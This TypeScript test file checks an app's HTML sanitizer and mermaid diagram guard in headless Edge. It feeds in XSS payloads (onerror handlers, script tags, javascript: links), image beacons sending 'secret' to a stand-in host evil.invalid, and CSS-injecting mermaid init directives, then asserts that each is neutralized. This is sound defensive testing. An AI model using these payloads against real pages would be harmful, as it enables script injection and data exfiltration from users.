// lib/htmlPolicy.ts with the real DOMPurify and the real mermaid, in a real Edge, offline. It is the
// only test here that needs a browser: these rules are about what a browser does. Skipped without Edge.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { stripTypeScriptTypes } from 'node:module'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
import { keepHighlightClasses, mermaidIsInert, MERMAID_SECURE_KEYS } from '../src/lib/htmlPolicy.ts'

const EDGE = ['C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe', 'C:/Program Files/Microsoft/Edge/Application/msedge.exe', '/usr/bin/microsoft-edge'].find(existsSync)
const web = fileURLToPath(new URL('..', import.meta.url))

// Runs a script in a page with the rules loaded; what it returns comes back as JSON.
function inEdge(script: string): any {
  const dir = mkdtempSync(join(tmpdir(), 'lucode-sanitize-'))
  const policy = stripTypeScriptTypes(readFileSync(join(web, 'src/lib/htmlPolicy.ts'), 'utf8')).replace(/^export /gm, '')
  const page = join(dir, 'page.html')
  writeFileSync(page, `<!doctype html><meta charset=utf-8><body>
<script src="${pathToFileURL(join(web, 'node_modules/dompurify/dist/purify.js')).href}"></script>
<script src="${pathToFileURL(join(web, 'node_modules/mermaid/dist/mermaid.min.js')).href}"></script>
<script>${policy.replace(/<\/script/g, '<\\/script')}
const { sanitizeHtml, sanitizeUntrustedHtml } = makeSanitizers(DOMPurify(window), document);
(async () => {
  const value = await (async () => { ${script} })();
  const t = document.createElement('textarea');
  t.setAttribute('data-r', encodeURIComponent(JSON.stringify(value)));
  document.documentElement.appendChild(t);
})();
</script>`)
  try {
    const dom = execFileSync(EDGE!, ['--headless=new', '--disable-gpu', '--no-first-run', `--user-data-dir=${join(dir, 'profile')}`, '--allow-file-access-from-files', '--virtual-time-budget=15000', '--dump-dom', pathToFileURL(page).href], { encoding: 'utf8', timeout: 90000, maxBuffer: 1 << 28, stdio: ['ignore', 'pipe', 'ignore'] })
    const m = /data-r="([^"]*)"/.exec(dom)
    assert.ok(m, 'the page did not finish')
    return JSON.parse(decodeURIComponent(m[1]))
  } finally {
    try { rmSync(dir, { recursive: true, force: true }) } catch { /* Edge may still hold it for a moment */ }
  }
}

const skip = EDGE ? false : 'Edge is not installed'

test('only the highlighter keeps its classes', () => {
  assert.equal(keepHighlightClasses('hljs language-go'), 'hljs language-go')
  assert.equal(keepHighlightClasses('hljs-title function_'), 'hljs-title function_')
  assert.equal(keepHighlightClasses('plugin-dialog__backdrop'), '')
  assert.equal(keepHighlightClasses('msg__text hljs-keyword settings-modal'), 'hljs-keyword')
})

test('an answer cannot wear the app\'s styles, and highlighting survives', { skip }, () => {
  const out = inEdge(`return {
    overlay: sanitizeHtml('<div class="plugin-dialog__backdrop" id="root" name="x"><a href="https://evil.invalid/">Sign in</a></div>'),
    code: sanitizeHtml('<pre><code class="hljs language-go"><span class="hljs-keyword">func</span> <span class="hljs-title function_">main</span></code></pre>'),
    script: sanitizeHtml('<img src=x onerror=alert(1)><script>alert(1)<\\/script><a href="javascript:alert(1)">x</a><form><input></form><style>body{display:none}</style><div style="position:fixed">y</div>'),
    keeps: sanitizeHtml('<table><tr><th>A</th></tr></table><b>b</b><a href="https://a.example/">l</a><img src="https://a.example/i.png" alt="i">'),
  }`)
  assert.doesNotMatch(out.overlay, /class=|id=|name=/)
  assert.match(out.overlay, /<a href="https:\/\/evil\.invalid\/">Sign in<\/a>/, 'the words stay')
  assert.match(out.code, /<code class="hljs language-go"><span class="hljs-keyword">func<\/span> <span class="hljs-title function_">main<\/span>/)
  assert.doesNotMatch(out.script, /onerror|<script|javascript:|<form|<input|<style|style=/)
  assert.match(out.keeps, /<table>/)
  assert.match(out.keeps, /<img src="https:\/\/a\.example\/i\.png"/, 'an ordinary chat keeps its images')
})

test('in a plugin\'s answer nothing loads by itself', { skip }, () => {
  const out = inEdge(`
    const html = sanitizeUntrustedHtml('<p>a <img src="https://evil.invalid/?d=secret" alt="chart"> <img src="https://evil.invalid/2"> <img src="data:image/png;base64,AA" alt="pic"> <video src="https://evil.invalid/v" poster="https://evil.invalid/p"></video> <table background="https://evil.invalid/b"><tr><td>c</td></tr></table> <picture><source srcset="https://evil.invalid/s"></picture></p>');
    const host = document.createElement('div'); host.innerHTML = html; document.body.appendChild(host);
    await new Promise(r => setTimeout(r, 300));
    return { html, loaded: performance.getEntriesByType('resource').map(e => e.name).filter(n => n.includes('evil')) };
  `)
  assert.deepEqual(out.loaded, [])
  assert.doesNotMatch(out.html, /<img|<video|<source|<picture|background=|poster=|srcset=/)
  assert.match(out.html, /<a href="https:\/\/evil\.invalid\/\?d=secret"[^>]*>chart<\/a>/, 'a remote image is a link')
  assert.match(out.html, /<a href="https:\/\/evil\.invalid\/2"[^>]*>https:\/\/evil\.invalid\/2<\/a>/)
  assert.match(out.html, / pic /, 'anything else keeps its words only')
  assert.match(out.html, /<table>/)
})

test('a diagram cannot write CSS into the page', { skip }, () => {
  const out = inEdge(`
    mermaid.initialize({ startOnLoad: false, securityLevel: 'strict', theme: 'default', secure: MERMAID_SECURE_KEYS });
    const { svg } = await mermaid.render('m1', '%%{init: {"themeCSS": ".node rect { fill: url(https://evil.invalid/css) }", "fontFamily": "x; } a { background: url(https://evil.invalid/f) } b {"}}%%\\nflowchart LR\\n A-->B');
    const plain = await mermaid.render('m2', 'flowchart LR\\n A-->B');
    return { svg, plain: plain.svg };
  `)
  assert.doesNotMatch(out.svg, /evil\.invalid/)
  assert.match(out.plain, /<svg/)
  assert.ok(MERMAID_SECURE_KEYS.includes('themeCSS'))
})

test('a diagram from a plugin that could load something stays source', () => {
  for (const active of [
    'flowchart LR\n A["<img src=\'https://evil.invalid/x\'>"]-->B',
    'flowchart LR\n A@{ img: "https://evil.invalid/x", label: "x" }',
    '%%{init: {"themeCSS": "x"}}%%\nflowchart LR\n A-->B',
    '---\nconfig:\n  look: handDrawn\n---\nflowchart LR\n A-->B',
    'flowchart LR\n A-->B\n click A "https://evil.invalid/"',
    'flowchart LR\n A["fa:fa-user"]-->B',
  ]) assert.equal(mermaidIsInert(active), false, active)
  for (const inert of [
    'flowchart LR\n A[Card moved] --> B{Done?}\n B -->|yes| C[Send webhook]',
    'sequenceDiagram\n Alice->>Bob: Hello\n Bob-->>Alice: Hi',
    'stateDiagram-v2\n [*] --> Open\n Open --> Closed',
  ]) assert.equal(mermaidIsInert(inert), true, inert)
})

test('what the mermaid guard is for: the labels and shapes it stops do load', { skip }, () => {
  const out = inEdge(`
    mermaid.initialize({ startOnLoad: false, securityLevel: 'strict', theme: 'default', secure: MERMAID_SECURE_KEYS });
    const { svg } = await mermaid.render('m3', 'flowchart LR\\n A["<img src=\\'https://evil.invalid/label\\'>"]-->B');
    const host = document.createElement('div'); host.innerHTML = svg; document.body.appendChild(host);
    await new Promise(r => setTimeout(r, 300));
    return performance.getEntriesByType('resource').map(e => e.name).filter(n => n.includes('evil'));
  `)
  assert.ok(out.length > 0, 'if mermaid stops loading these, the guard can go')
})
